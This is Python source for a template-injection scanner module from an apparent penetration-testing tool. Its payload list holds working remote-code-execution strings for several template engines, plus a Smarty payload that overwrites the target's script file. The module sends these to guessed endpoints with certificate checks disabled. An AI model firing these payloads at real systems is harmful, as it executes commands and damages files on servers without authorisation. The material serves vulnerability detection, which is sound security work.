"""
Jarwis AGI Pen Test - Server-Side Template Injection (SSTI) Scanner
Detects SSTI vulnerabilities (A03:2021 - Injection)
Based on Web Hacking 101 techniques - adapted for 2025
"""

import asyncio
import logging
import re
from typing import Dict, List, Optional
from dataclasses import dataclass
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse, urljoin
import aiohttp
import ssl

logger = logging.getLogger(__name__)


@dataclass
class ScanResult:
    id: str
    category: str
    severity: str
    title: str
    description: str
    url: str
    method: str
    parameter: str = ""
    evidence: str = ""
    remediation: str = ""
    cwe_id: str = ""
    poc: str = ""
    reasoning: str = ""
    request_data: str = ""
    response_data: str = ""


class SSTIScanner:
    """
    Scans for Server-Side Template Injection vulnerabilities
    OWASP A03:2021 - Injection
    CWE-94: Improper Control of Generation of Code (Code Injection)
    
    Tested template engines:
    - Jinja2 (Python)
    - Twig (PHP)
    - Freemarker (Java)
    - Velocity (Java)
    - Smarty (PHP)
    - Mako (Python)
    - ERB (Ruby)
    - Pebble (Java)
    - Thymeleaf (Java)
    - Handlebars (JavaScript)
    - Mustache (Multiple)
    - EJS (JavaScript)
    - Nunjucks (JavaScript)
    """
    
    # Mathematical probe - works on most template engines
    MATH_PROBE = '{{7*7}}'
    EXPECTED_RESULT = '49'
    
    # Template-specific payloads for identification and exploitation
    SSTI_PAYLOADS = [
        # Universal detection
        ('{{7*7}}', '49', 'Generic Jinja2/Twig'),
        ('${7*7}', '49', 'Generic Expression Language'),
        ('#{7*7}', '49', 'Generic Ruby ERB/Thymeleaf'),
        ('{{7*\'7\'}}', '7777777', 'Jinja2 string multiplication'),
        
        # Jinja2 (Python/Flask)
        ('{{config}}', 'SECRET_KEY', 'Jinja2 config access'),
        ('{{self.__class__.__mro__}}', 'object', 'Jinja2 MRO access'),
        ('{{request.environ}}', 'REMOTE_ADDR', 'Jinja2 request environ'),
        ('{{"".__class__.__bases__}}', 'object', 'Jinja2 class bases'),
        
        # Twig (PHP)
        ('{{_self.env.registerUndefinedFilterCallback("id")}}{{_self.env.getFilter("test")}}', 'uid=', 'Twig RCE'),
        ('{{["id"]|filter("system")}}', 'uid=', 'Twig system filter'),
        
        # Freemarker (Java)
        ('${7*7}', '49', 'Freemarker expression'),
        ('${"freemarker.template.utility.Execute"?new()("id")}', 'uid=', 'Freemarker RCE'),
        ('<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}', 'uid=', 'Freemarker assign'),
        
        # Velocity (Java)
        ('#set($x = 7*7)${x}', '49', 'Velocity set'),
        ('$class.inspect("java.lang.Runtime")', 'Runtime', 'Velocity class inspection'),
        
        # Smarty (PHP)
        ('{php}echo "SSTI_VULN";{/php}', 'SSTI_VULN', 'Smarty PHP tag'),
        ('{system("id")}', 'uid=', 'Smarty system'),
        ('{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"SSTI_PWNED",self::clearConfig())}', 'error', 'Smarty file write'),
        
        # Mako (Python)
        ('${self.module.cache.util.os.popen("id").read()}', 'uid=', 'Mako RCE'),
        ('<%import os%>${os.popen("id").read()}', 'uid=', 'Mako import'),
        
        # ERB (Ruby)
        ('<%= 7*7 %>', '49', 'ERB expression'),
        ('<%= system("id") %>', 'uid=', 'ERB system'),
        ('<%= `id` %>', 'uid=', 'ERB backticks'),
        
        # Pebble (Java)
        ('{{7*7}}', '49', 'Pebble expression'),
        ('{% set cmd = "id" %}{{ cmd.toUpperCase() }}', 'ID', 'Pebble set'),
        
        # Thymeleaf (Java/Spring)
        ('__${7*7}__::x', '49', 'Thymeleaf expression'),
        ('__${T(java.lang.Runtime).getRuntime().exec("id")}__::x', 'Process', 'Thymeleaf RCE'),
        
        # Handlebars (JavaScript)
        ('{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{/with}}{{/with}}{{/with}}', 'function', 'Handlebars prototype'),
        
        # Nunjucks (JavaScript)  
        ('{{range.constructor("return global.process.mainModule.require(\'child_process\').execSync(\'id\')")()}}', 'uid=', 'Nunjucks RCE'),
        
        # EJS (JavaScript)
        ('<%- 7*7 %>', '49', 'EJS expression'),
        ('<%- global.process.mainModule.require("child_process").execSync("id") %>', 'uid=', 'EJS RCE'),
        
        # Expression Language (Java)
        ('${applicationScope}', 'application', 'EL application scope'),
        ('${pageContext}', 'PageContext', 'EL page context'),
        
        # Angular/AngularJS (Client-side but sometimes rendered server-side)
        ('{{constructor.constructor("return this")()}}', 'Window', 'Angular sandbox escape'),
        
        # Jade/Pug (JavaScript)
        ('#{ 7*7 }', '49', 'Jade/Pug expression'),
    ]
    
    # Parameters likely to be template-rendered
    TEMPLATE_PARAMS = [
        'template', 'page', 'name', 'title', 'content', 'text', 'body',
        'message', 'msg', 'subject', 'email', 'username', 'user',
        'desc', 'description', 'comment', 'feedback', 'review',
        'preview', 'render', 'view', 'layout', 'theme', 'skin',
        'header', 'footer', 'widget', 'block', 'section',
        'item', 'product', 'article', 'post', 'bio', 'about',
        'q', 'search', 'query', 'filter', 'lang', 'locale',
        'format', 'output', 'file', 'include', 'partial',
    ]
    
    # Endpoints likely to use templates
    TEMPLATE_ENDPOINTS = [
        '/preview', '/render', '/template', '/email/preview',
        '/pdf/generate', '/report', '/export', '/invoice',
        '/print', '/download', '/generate', '/view',
        '/contact', '/feedback', '/subscribe', '/newsletter',
        '/profile', '/settings', '/about', '/help',
        '/search', '/blog', '/article', '/post',
    ]
    
    DEFAULT_HEADERS = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    }
    
    def __init__(self, config: dict, context):
        self.config = config
        self.context = context
        self.browser = None
        self.results: List[ScanResult] = []
        self.rate_limit = config.get('rate_limit', 10)
        self.timeout = config.get('timeout', 15)
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
    async def scan(self) -> List[ScanResult]:
        """Main scan method"""
        logger.info("Starting SSTI vulnerability scan...")
        self.results = []
        
        base_url = self.config.get('target', {}).get('url', '')
        if not base_url:
            base_url = self.config.get('target_url', '')
        
        if not base_url:
            return self.results
        
        # Collect URLs
        urls_to_test = set()
        urls_to_test.add(base_url)
        
        for endpoint in self.TEMPLATE_ENDPOINTS:
            urls_to_test.add(urljoin(base_url, endpoint))
        
        if hasattr(self.context, 'endpoints'):
            for endpoint in self.context.endpoints[:40]:
                url = endpoint.get('url', '') if isinstance(endpoint, dict) else str(endpoint)
                if url:
                    urls_to_test.add(url)
        
        connector = aiohttp.TCPConnector(ssl=self.ssl_context, limit=10)
        
        async with aiohttp.ClientSession(
            headers=self.DEFAULT_HEADERS,
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=self.timeout)
        ) as session:
            
            for url in urls_to_test:
                try:
                    await asyncio.sleep(1 / self.rate_limit)
                    await self._test_ssti(session, url)
                except Exception as e:
                    logger.debug(f"Error testing {url}: {e}")
        
        logger.info(f"SSTI scan complete. Found {len(self.results)} vulnerabilities")
        return self.results
    
    async def _test_ssti(self, session: aiohttp.ClientSession, url: str):
        """Test URL for SSTI vulnerabilities"""
        parsed = urlparse(url)
        
        # Get existing parameters
        existing_params = list(parse_qs(parsed.query).keys()) if parsed.query else []
        params_to_test = list(set(existing_params + self.TEMPLATE_PARAMS[:15]))
        
        for param in params_to_test:
            # First do quick probe with math expression
            quick_detected = await self._quick_ssti_probe(session, url, param)
            
            if quick_detected:
                # Detailed testing to identify template engine
                await self._identify_template_engine(session, url, param)
                return  # Found on this URL
    
    async def _quick_ssti_probe(self, session: aiohttp.ClientSession, url: str, param: str) -> bool:
        """Quick probe with mathematical expression"""
        parsed = urlparse(url)
        
        # Test payloads for quick detection
        quick_payloads = [
            ('{{7*7}}', '49'),
            ('${7*7}', '49'),
            ('#{7*7}', '49'),
            ('<%= 7*7 %>', '49'),
            ('{{7*\'7\'}}', '7777777'),
        ]
        
        for i, (payload, expected) in enumerate(quick_payloads):
            # VERBOSE LOGGING: Show each SSTI payload being tested
            logger.info(f"[SSTI] Testing payload {i+1}/5 on {param}: {payload}")
            
            try:
                # Build test URL
                existing_params = parse_qs(parsed.query) if parsed.query else {}
                existing_params[param] = [payload]
                new_query = urlencode(existing_params, doseq=True)
                test_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))
                
                async with session.get(test_url) as response:
                    body = await response.text()
                    
                    # Check if result appears but payload doesn't
                    if expected in body and payload not in body:
                        return True
                    
                    # Also check if payload is reflected but result is computed
                    # This catches some edge cases
                    if expected in body:
                        # Make sure it's not just reflected
                        test_payload2 = payload.replace('7*7', '8*8')
                        existing_params[param] = [test_payload2]
                        new_query2 = urlencode(existing_params, doseq=True)
                        test_url2 = urlunparse((
                            parsed.scheme, parsed.netloc, parsed.path,
                            parsed.params, new_query2, parsed.fragment
                        ))
                        
                        async with session.get(test_url2) as response2:
                            body2 = await response2.text()
                            if '64' in body2:  # 8*8 = 64
                                return True
                                
            except Exception as e:
                logger.debug(f"Quick probe error: {e}")
        
        return False
    
    async def _identify_template_engine(self, session: aiohttp.ClientSession, url: str, param: str):
        """Identify specific template engine and report vulnerability"""
        parsed = urlparse(url)
        
        for payload, indicator, engine in self.SSTI_PAYLOADS:
            try:
                existing_params = parse_qs(parsed.query) if parsed.query else {}
                existing_params[param] = [payload]
                new_query = urlencode(existing_params, doseq=True)
                test_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))
                
                async with session.get(test_url) as response:
                    body = await response.text()
                    
                    if indicator in body and payload not in body:
                        # Determine severity based on impact
                        severity = "critical" if any(x in payload.lower() for x in ['exec', 'system', 'popen', 'runtime']) else "high"
                        
                        result = ScanResult(
                            id=f"SSTI-{len(self.results)+1}",
                            category="A03:2021 - Injection",
                            severity=severity,
                            title=f"Server-Side Template Injection ({engine})",
                            description=f"The {param} parameter is vulnerable to Server-Side Template Injection using {engine} syntax. This can lead to Remote Code Execution.",
                            url=test_url,
                            method="GET",
                            parameter=param,
                            evidence=f"Template evaluated: '{payload}' produced '{indicator}'",
                            remediation="Never allow user input to be directly used in templates. Use a logic-less template engine or sandboxed environment. Implement input validation and output encoding.",
                            cwe_id="CWE-94",
                            poc=f"curl '{test_url}'",
                            reasoning=f"Template engine {engine} detected via expression evaluation"
                        )
                        self.results.append(result)
                        logger.info(f"Found SSTI ({engine}): {param} on {url}")
                        return
                        
            except Exception as e:
                logger.debug(f"Engine identification error: {e}")
